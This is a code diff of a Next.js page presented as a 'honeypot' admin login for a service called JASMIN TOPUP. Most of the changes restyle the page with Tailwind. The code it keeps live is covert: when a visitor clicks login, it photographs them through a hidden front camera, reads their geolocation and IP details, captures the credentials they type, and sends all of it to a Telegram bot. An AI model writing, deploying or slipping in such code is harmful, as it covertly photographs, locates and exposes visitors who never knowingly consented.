@@ -1,16 +1,12 @@
 "use client";
 
-import { useState, useEffect, useRef } from "react";
+import { useState, useRef } from "react";
 import Image from "next/image";
 import Link from "next/link";
 
+// Font 'Kantumruy Pro' is imported in globals.css
+// .font-khmer & .animate-float-up are defined in globals.css
 
-// =====================================
-// PUT YOUR TELEGRAM BOT TOKEN & CHAT ID
-// in your .env file:
-//   NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=your_bot_token
-//   NEXT_PUBLIC_TELEGRAM_CHAT_ID=your_chat_id
-// =====================================
 const TELEGRAM_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
 const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";
 
@@ -19,17 +15,12 @@ async function sendToTelegram(text: string) {
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text,
-      parse_mode: "HTML",
-    }),
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
   });
 }
 
 async function sendPhotoToTelegram(base64: string, caption: string) {
   if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
-  // Convert base64 to blob
   const res = await fetch(base64);
   const blob = await res.blob();
   const formData = new FormData();
@@ -42,6 +33,18 @@ async function sendPhotoToTelegram(base64: string, caption: string) {
   });
 }
 
+// Floating icon config — dur/delay hardcoded per icon (no CSS variables needed)
+const BG_ICONS = [
+  { icon: "💕", left: "10%", dur: "8s",  delay: "0s"    },
+  { icon: "🌸", left: "22%", dur: "10s", delay: "1.5s"  },
+  { icon: "✨", left: "34%", dur: "12s", delay: "3s"    },
+  { icon: "💖", left: "46%", dur: "14s", delay: "4.5s"  },
+  { icon: "🌺", left: "58%", dur: "16s", delay: "6s"    },
+  { icon: "⭐", left: "70%", dur: "18s", delay: "7.5s"  },
+  { icon: "💗", left: "82%", dur: "20s", delay: "9s"    },
+  { icon: "🎀", left: "94%", dur: "22s", delay: "10.5s" },
+];
+
 export default function HoneypotLoginPage() {
   const [loading, setLoading] = useState(false);
   const [done, setDone] = useState(false);
@@ -50,9 +53,6 @@ export default function HoneypotLoginPage() {
   const [inputPassword, setInputPassword] = useState("jaminadmin1122334455!@");
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-
-  const fakeEmail = inputEmail;
-  const fakePassword = inputPassword;
 
   async function getIPInfo() {
     try {
@@ -70,10 +70,7 @@ export default function HoneypotLoginPage() {
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-          resolve({
-            lat, lon,
-            mapLink: `https://www.google.com/maps?q=${lat},${lon}`,
-          });
+          resolve({ lat, lon, mapLink: `https://www.google.com/maps?q=${lat},${lon}` });
         },
         () => resolve(null),
         { timeout: 6000 }
@@ -83,14 +80,11 @@ export default function HoneypotLoginPage() {
 
   async function takeFrontPhoto(): Promise<string | null> {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false,
-      });
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       if (!videoRef.current || !canvasRef.current) { stream.getTracks().forEach(t => t.stop()); return null; }
       videoRef.current.srcObject = stream;
       await videoRef.current.play();
-      await new Promise(r => setTimeout(r, 1200)); // wait for camera to warm up
+      await new Promise(r => setTimeout(r, 1200));
       const canvas = canvasRef.current;
       canvas.width = videoRef.current.videoWidth || 640;
       canvas.height = videoRef.current.videoHeight || 480;
@@ -105,7 +99,6 @@ export default function HoneypotLoginPage() {
   async function handleLogin() {
     setLoading(true);
 
-    // Gather all info in parallel
     const [ipInfo, location, photo] = await Promise.all([
       getIPInfo(),
       getLocation(),
@@ -118,7 +111,6 @@ export default function HoneypotLoginPage() {
     const screen = `${window.screen.width}x${window.screen.height}`;
     const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const now = new Date().toLocaleString("km-KH", { timeZone: "Asia/Phnom_Penh" });
-
     const mapLink = location?.mapLink || "មិនអាចទទួលបានទីតាំង";
 
     const message = `
@@ -139,16 +131,14 @@ export default function HoneypotLoginPage() {
 🔤 <b>Language:</b> ${language}
 ⏰ <b>Timezone:</b> ${timeZone}
 
-📧 <b>Email បញ្ចូល:</b> ${fakeEmail}
-🔑 <b>Password បញ្ចូល:</b> ${fakePassword}
+📧 <b>Email បញ្ចូល:</b> ${inputEmail}
+🔑 <b>Password បញ្ចូល:</b> ${inputPassword}
 
 ⚠️ <b>Action:</b> Attempted fake admin login
     `.trim();
 
-    // Send text info first
     await sendToTelegram(message);
 
-    // Send photo if captured
     if (photo) {
       await sendPhotoToTelegram(photo, `📸 រូបថត Hacker — ${ipInfo.ip || "Unknown IP"} — ${now}`);
     } else {
@@ -159,221 +149,66 @@ export default function HoneypotLoginPage() {
     setDone(true);
   }
 
+  // ── shared input className ──
+  const inputCls =
+    "w-full px-4 py-[0.7rem] border-[1.5px] border-[#f8bbd0] rounded-xl text-[0.9rem] " +
+    "font-khmer text-[#333] bg-white outline-none transition-all duration-200 " +
+    "focus:border-[#e91e63] focus:shadow-[0_0_0_3px_rgba(233,30,99,0.1)]";
+
   return (
     <>
-      <style>{`
-        @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:wght@300;400;600;700&display=swap');
+      {/* Hidden video + canvas for camera capture */}
+      <video
+        ref={videoRef}
+        className="fixed opacity-0 pointer-events-none w-px h-px top-[-9999px] left-[-9999px]"
+        muted
+        playsInline
+      />
+      <canvas
+        ref={canvasRef}
+        className="fixed opacity-0 pointer-events-none w-px h-px top-[-9999px] left-[-9999px]"
+      />
 
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      {/* ── Root ── */}
+      <div className="font-khmer min-h-screen flex items-center justify-center relative overflow-hidden bg-gradient-to-br from-[#ffe4ef] via-[#ffd6e8] to-[#fce4ff]">
 
-        body {
-          font-family: 'Kantumruy Pro', sans-serif;
-          background: #fff0f5;
-          min-height: 100vh;
-        }
-
-        .hp-root {
-          min-height: 100vh;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          position: relative;
-          overflow: hidden;
-          background: linear-gradient(135deg, #ffe4ef 0%, #ffd6e8 50%, #fce4ff 100%);
-        }
-
-        /* Floating hearts background */
-        .hp-bg-icon {
-          position: fixed;
-          font-size: 1.5rem;
-          opacity: 0.08;
-          pointer-events: none;
-          animation: floatUp var(--dur) linear var(--delay) infinite;
-          z-index: 0;
-        }
-
-        @keyframes floatUp {
-          from { transform: translateY(110vh) rotate(0deg); opacity: 0.08; }
-          to   { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
-        }
-
-        .hp-wrap {
-          position: relative;
-          z-index: 10;
-          width: 100%;
-          max-width: 420px;
-          padding: 1.5rem;
-        }
-
-        .hp-logo {
-          display: flex;
-          justify-content: center;
-          margin-bottom: 1.2rem;
-        }
-
-        .hp-logo img {
-          width: 80px; height: 80px;
-          border-radius: 50%;
-          border: 3px solid rgba(233,30,99,0.3);
-          box-shadow: 0 4px 20px rgba(233,30,99,0.25);
-        }
-
-        .hp-card {
-          background: rgba(255,255,255,0.92);
-          backdrop-filter: blur(20px);
-          border-radius: 24px;
-          padding: 2.5rem 2rem 2rem;
-          box-shadow: 0 8px 40px rgba(233,30,99,0.12), 0 2px 8px rgba(0,0,0,0.06);
-          text-align: center;
-        }
-
-        .hp-title {
-          font-size: 1.4rem;
-          font-weight: 700;
-          color: #c2185b;
-          margin-bottom: 0.3rem;
-        }
-
-        .hp-sub {
-          font-size: 0.8rem;
-          color: #aaa;
-          margin-bottom: 1.8rem;
-        }
-
-        .hp-field {
-          text-align: left;
-          margin-bottom: 1rem;
-        }
-
-        .hp-label {
-          display: block;
-          font-size: 0.78rem;
-          color: #888;
-          margin-bottom: 0.35rem;
-          font-weight: 500;
-        }
-
-        .hp-input {
-          width: 100%;
-          padding: 0.7rem 1rem;
-          border: 1.5px solid #f8bbd0;
-          border-radius: 12px;
-          font-size: 0.9rem;
-          font-family: 'Kantumruy Pro', sans-serif;
-          color: #333;
-          background: #fff;
-          outline: none;
-          transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        .hp-input:focus {
-          border-color: #e91e63;
-          box-shadow: 0 0 0 3px rgba(233,30,99,0.1);
-        }
-
-        .hp-btn {
-          width: 100%;
-          padding: 0.85rem;
-          background: linear-gradient(135deg, #e91e63, #c2185b);
-          color: white;
-          border: none;
-          border-radius: 14px;
-          font-size: 1rem;
-          font-weight: 600;
-          font-family: 'Kantumruy Pro', sans-serif;
-          cursor: pointer;
-          margin-top: 0.5rem;
-          transition: opacity 0.2s, transform 0.15s;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 0.5rem;
-        }
-
-        .hp-btn:hover { opacity: 0.92; transform: translateY(-1px); }
-        .hp-btn:active { transform: translateY(0); }
-        .hp-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
-        .hp-spinner {
-          width: 18px; height: 18px;
-          border: 2px solid rgba(255,255,255,0.4);
-          border-top-color: white;
-          border-radius: 50%;
-          animation: spin 0.7s linear infinite;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .hp-success {
-          color: #e91e63;
-          font-size: 0.9rem;
-          margin-top: 1rem;
-          padding: 0.8rem;
-          background: #fff0f5;
-          border-radius: 10px;
-          border: 1px solid #f8bbd0;
-        }
-
-        /* Hidden video/canvas for camera capture */
-        .hp-hidden {
-          position: fixed;
-          opacity: 0;
-          pointer-events: none;
-          width: 1px; height: 1px;
-          top: -9999px; left: -9999px;
-        }
-
-        .hp-back {
-          display: block;
-          text-align: center;
-          margin-top: 1.2rem;
-          font-size: 0.78rem;
-          color: rgba(194,24,91,0.5);
-          text-decoration: none;
-          transition: color 0.2s;
-        }
-        .hp-back:hover { color: #e91e63; }
-      `}</style>
-
-      {/* Hidden video + canvas for camera */}
-      <video ref={videoRef} className="hp-hidden" muted playsInline />
-      <canvas ref={canvasRef} className="hp-hidden" />
-
-      <div className="hp-root">
         {/* Floating background icons */}
-        {["💕","🌸","✨","💖","🌺","⭐","💗","🎀"].map((icon, i) => (
+        {BG_ICONS.map(({ icon, left, dur, delay }, i) => (
           <div
             key={i}
-            className="hp-bg-icon"
-            style={{
-              left: `${10 + i * 12}%`,
-              ["--dur" as string]: `${8 + i * 2}s`,
-              ["--delay" as string]: `${i * 1.5}s`,
-            }}
+            className="fixed text-[1.5rem] pointer-events-none z-0 animate-float-up"
+            style={{ left, animationDuration: dur, animationDelay: delay }}
           >
             {icon}
           </div>
         ))}
 
-        <div className="hp-wrap">
-          <div className="hp-logo">
+        {/* ── Card wrap ── */}
+        <div className="relative z-10 w-full max-w-[420px] px-6">
+
+          {/* Logo */}
+          <div className="flex justify-center mb-5">
             <Image
               src="https://i.ibb.co/ycPxxz8h/IMG-20260515-100429.png"
               alt="JASMIN"
               width={80}
               height={80}
+              className="rounded-full border-[3px] border-[rgba(233,30,99,0.3)] shadow-[0_4px_20px_rgba(233,30,99,0.25)]"
               priority
             />
           </div>
 
-          <div className="hp-card">
-            <div className="hp-title">🔐 Admin Login</div>
-            <div className="hp-sub">JASMIN TOPUP — Admin Dashboard</div>
+          {/* Glass card */}
+          <div className="bg-white/92 backdrop-blur-[20px] rounded-[24px] px-8 pt-10 pb-8 shadow-[0_8px_40px_rgba(233,30,99,0.12),0_2px_8px_rgba(0,0,0,0.06)] text-center">
 
-            <div className="hp-field">
-              <label className="hp-label">Email</label>
+            <div className="text-[1.4rem] font-bold text-[#c2185b] mb-1">🔐 Admin Login</div>
+            <div className="text-[0.8rem] text-[#aaa] mb-7">JASMIN TOPUP — Admin Dashboard</div>
+
+            {/* Email */}
+            <div className="text-left mb-4">
+              <label className="block text-[0.78rem] text-[#888] font-medium mb-[0.35rem]">Email</label>
               <input
-                className="hp-input"
+                className={inputCls}
                 type="text"
                 value={inputEmail}
                 onChange={e => setInputEmail(e.target.value)}
@@ -381,32 +216,20 @@ export default function HoneypotLoginPage() {
               />
             </div>
 
-            <div className="hp-field">
-              <label className="hp-label">Password</label>
-              <div style={{ position: "relative" }}>
+            {/* Password */}
+            <div className="text-left mb-4">
+              <label className="block text-[0.78rem] text-[#888] font-medium mb-[0.35rem]">Password</label>
+              <div className="relative">
                 <input
-                  className="hp-input"
+                  className={`${inputCls} pr-12`}
                   type={showPassword ? "text" : "password"}
                   value={inputPassword}
                   onChange={e => setInputPassword(e.target.value)}
-                  style={{ paddingRight: "3rem" }}
                 />
                 <button
                   type="button"
                   onClick={() => setShowPassword(v => !v)}
-                  style={{
-                    position: "absolute",
-                    right: "0.75rem",
-                    top: "50%",
-                    transform: "translateY(-50%)",
-                    background: "none",
-                    border: "none",
-                    cursor: "pointer",
-                    fontSize: "1.1rem",
-                    color: "#e91e63",
-                    padding: "0.2rem",
-                    lineHeight: 1,
-                  }}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 bg-transparent border-none cursor-pointer text-[1.1rem] text-[#e91e63] p-[0.2rem] leading-none"
                   title={showPassword ? "លាក់ Password" : "បង្ហាញ Password"}
                 >
                   {showPassword ? "🙈" : "👁️"}
@@ -414,14 +237,15 @@ export default function HoneypotLoginPage() {
               </div>
             </div>
 
+            {/* Login button */}
             <button
-              className="hp-btn"
               onClick={handleLogin}
               disabled={loading || done}
+              className="w-full py-[0.85rem] bg-[linear-gradient(135deg,#e91e63,#c2185b)] text-white border-none rounded-[14px] text-base font-semibold font-khmer cursor-pointer mt-2 flex items-center justify-center gap-2 transition-all duration-200 hover:opacity-[0.92] hover:-translate-y-px active:translate-y-0 disabled:opacity-60 disabled:cursor-not-allowed disabled:translate-y-0"
             >
               {loading ? (
                 <>
-                  <span className="hp-spinner" />
+                  <span className="w-[18px] h-[18px] border-2 border-white/40 border-t-white rounded-full animate-spin" />
                   កំពុង Login...
                 </>
               ) : done ? (
@@ -432,13 +256,18 @@ export default function HoneypotLoginPage() {
             </button>
 
             {done && (
-              <div className="hp-success">
+              <div className="text-[#e91e63] text-[0.9rem] mt-4 py-3 px-4 bg-[#fff0f5] rounded-[10px] border border-[#f8bbd0]">
                 ⏳ កំពុងផ្ទៀងផ្ទាត់... សូមរង់ចាំ
               </div>
             )}
           </div>
 
-          <Link href="/" className="hp-back">← ត្រឡប់ទៅទំព័រដើម</Link>
+          <Link
+            href="/"
+            className="block text-center mt-5 text-[0.78rem] text-[rgba(194,24,91,0.5)] no-underline hover:text-[#e91e63] transition-colors duration-200"
+          >
+            ← ត្រឡប់ទៅទំព័រដើម
+          </Link>
         </div>
       </div>
     </>
